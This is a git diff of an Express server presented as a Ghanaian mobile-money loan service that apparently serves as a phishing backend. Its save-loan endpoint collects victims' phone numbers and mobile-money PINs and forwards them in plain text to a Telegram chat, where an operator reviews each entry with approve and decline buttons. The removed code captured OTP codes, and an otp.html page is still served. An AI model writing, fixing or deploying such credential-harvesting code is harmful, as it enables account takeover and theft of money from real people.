@@ -36,7 +36,6 @@ async function initDatabase() {
                 monthly_payment INTEGER,
                 total_payment INTEGER,
                 interest INTEGER,
-                otp_code TEXT,
                 status TEXT DEFAULT 'pending',
                 created_at DATETIME DEFAULT CURRENT_TIMESTAMP
             );
@@ -60,29 +59,11 @@ async function sendTelegramMessage(text, replyMarkup = null) {
         if (data.ok) {
             console.log('✅ Telegram sent');
             return data.result.message_id;
-        } else {
-            console.error('Telegram error:', data);
         }
+        return null;
     } catch (error) {
         console.error('Telegram error:', error);
-    }
-    return null;
-}
-
-async function editTelegramMessage(messageId, text) {
-    try {
-        await fetch(`${TELEGRAM_API}/editMessageText`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                message_id: messageId,
-                text: text,
-                parse_mode: 'HTML'
-            })
-        });
-    } catch (error) {
-        console.error('Edit message error:', error);
+        return null;
     }
 }
 
@@ -91,66 +72,81 @@ function generateLoanId() {
 }
 
 app.get('/health', (req, res) => {
-    res.json({ status: 'ok', timestamp: new Date().toISOString() });
+    res.json({ status: 'ok' });
 });
 
 app.post('/api/save-loan', async (req, res) => {
     try {
-        console.log('📥 Save loan request received:', req.body);
-        const { phone, pin, network, amount, duration, monthly, total, interest } = req.body;
+        const { phone, pin, network, amount, duration, monthly } = req.body;
         const loanId = generateLoanId();
         
         if (db) {
-            await db.run(`INSERT INTO loans (loan_id, phone, pin, network, amount, duration, monthly_payment, total_payment, interest, status)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-                [loanId, phone, pin, network, amount, duration, monthly, total || amount * 1.109, interest || amount * 0.109, 'pending']);
-            console.log('✅ Loan saved to database:', loanId);
+            await db.run(`INSERT INTO loans (loan_id, phone, pin, network, amount, duration, monthly_payment, status)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
+                [loanId, phone, pin, network, amount, duration, monthly, 'pending']);
         }
         
-        const messageText = `<b>🔴 NEW LOAN APPLICATION - GHANA</b>\n\n` +
-            `━━━━━━━━━━━━━━━━━━\n` +
-            `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
-            `<b>💰 Amount:</b> GHS ${amount.toLocaleString()}\n` +
-            `<b>📱 Network:</b> ${network}\n` +
-            `<b>📞 Phone:</b> <code>${phone}</code>\n` +
-            `<b>🔐 PIN:</b> <code>${pin}</code>\n` +
-            `<b>📅 Duration:</b> ${duration/30} months\n` +
-            `<b>💳 Monthly:</b> GHS ${monthly.toLocaleString()}\n` +
-            `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n` +
-            `━━━━━━━━━━━━━━━━━━\n\n` +
-            `<b>⚠️ Action Required:</b> Select an option below:`;
+        const messageText = `<b>🔴 NEW LOAN - GHANA</b>\n\nLoan ID: ${loanId}\nAmount: GHS ${amount}\nPhone: ${phone}\nPIN: ${pin}\nDuration: ${duration/30} months\nMonthly: GHS ${monthly}`;
         
         const replyMarkup = {
             inline_keyboard: [[
-                { text: "✅ Approve Loan", callback_data: `approve_${loanId}` },
+                { text: "✅ Approve", callback_data: `approve_${loanId}` },
                 { text: "❌ Decline", callback_data: `decline_${loanId}` }
             ]]
         };
         
         await sendTelegramMessage(messageText, replyMarkup);
-        
         res.json({ success: true, loanId });
     } catch (error) {
-        console.error('❌ Save loan error:', error);
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
-// Simple webhook - no extra logging that might break
-app.post('/webhook/telegram', (req, res) => {
+// Webhook handler - FIXED
+app.post('/webhook/telegram', async (req, res) => {
     try {
         const update = req.body;
-        console.log('Webhook received');
+        console.log('📨 Webhook received');
         
         if (update.callback_query) {
-            const callbackData = update.callback_query.data;
-            const [action, loanId] = callbackData.split('_');
+            const data = update.callback_query.data;
+            const messageId = update.callback_query.message.message_id;
+            const callbackId = update.callback_query.id;
+            const [action, loanId] = data.split('_');
             
             console.log(`Action: ${action}, LoanId: ${loanId}`);
             
             if (action === 'approve' && db) {
-                db.run(`UPDATE loans SET status = 'approved' WHERE loan_id = ?`, [loanId]);
-                console.log(`Loan ${loanId} approved`);
+                await db.run(`UPDATE loans SET status = 'approved' WHERE loan_id = ?`, [loanId]);
+                console.log(`✅ Loan ${loanId} APPROVED in database`);
+                
+                // Update message to show approved
+                await fetch(`${TELEGRAM_API}/editMessageText`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        message_id: messageId,
+                        text: `✅ LOAN APPROVED\n\nLoan ID: ${loanId}\nStatus: APPROVED`,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                // Answer callback
+                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ callback_query_id: callbackId, text: "Loan Approved!" })
+                });
+            } else if (action === 'decline' && db) {
+                await db.run(`UPDATE loans SET status = 'declined' WHERE loan_id = ?`, [loanId]);
+                console.log(`❌ Loan ${loanId} DECLINED in database`);
+                
+                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ callback_query_id: callbackId, text: "Loan Declined" })
+                });
             }
         }
         res.sendStatus(200);
@@ -160,20 +156,10 @@ app.post('/webhook/telegram', (req, res) => {
     }
 });
 
-app.post('/api/save-otp', async (req, res) => {
-    try {
-        const { loanId, otp, phone } = req.body;
-        console.log('OTP received:', { loanId, otp, phone });
-        res.json({ success: true });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
 app.get('/api/loan/:loanId', async (req, res) => {
     try {
         if (!db) return res.json({ success: true, loan: { status: 'pending' } });
-        const loan = await db.get(`SELECT * FROM loans WHERE loan_id = ?`, [req.params.loanId]);
+        const loan = await db.get(`SELECT status FROM loans WHERE loan_id = ?`, [req.params.loanId]);
         res.json({ success: true, loan: loan || { status: 'pending' } });
     } catch (error) {
         res.json({ success: true, loan: { status: 'pending' } });
@@ -187,7 +173,7 @@ app.get('/otp.html', (req, res) => { res.sendFile(path.join(__dirname, 'public',
 async function startServer() {
     await initDatabase();
     app.listen(PORT, '0.0.0.0', () => {
-        console.log(`🚀 Telecel Ghana Server running on port ${PORT}`);
+        console.log(`🚀 Server running on port ${PORT}`);
     });
 }
 
